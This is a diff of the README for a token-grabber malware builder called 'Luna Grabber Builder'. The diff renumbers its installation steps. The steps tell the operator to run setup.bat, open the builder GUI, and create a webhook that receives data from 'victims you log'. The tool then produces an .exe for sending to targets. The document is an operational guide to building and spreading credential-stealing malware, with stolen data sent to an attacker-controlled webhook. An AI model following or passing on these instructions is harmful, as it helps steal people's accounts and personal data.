@@ -1,5 +1,5 @@
 <h1 align="center">
-  Luna Token Grabber
+  Luna Grabber Builder
 </h1>
 
 <div align="center">
@@ -69,35 +69,30 @@
   
 ## Installation
 
-### 1. Download Python:
-
-```
-Make sure you have Python installed 3.11+ and it is added to your path
-```
-### 2. Download The Files:
+### 1. Download The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-### 3. Open The setup.bat File:
+### 2. Open The setup.bat File:
 
 ```
 You dont need to install any modules opening setup.bat will install them for you. Then you can open the builder.pyw file which will
 open the gui.
 ```
-### 4. Create A Webhook:
+### 3. Create A Webhook:
 
 ```
 This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
 into the box which asks for your webhook.
 ```
-### 5. Configurable Options:
+### 4. Configurable Options:
 
 ```
 Now once you've done that you can tick on the options that you want enabled and anything you don't understand you can go 
 to the documentation where each option is explained.
 ```
-### 6. What Now?
+### 5. What Now?
 
 ```
 The .exe file will appear in the same folder where all the other files are with the name you set it as and you can now send
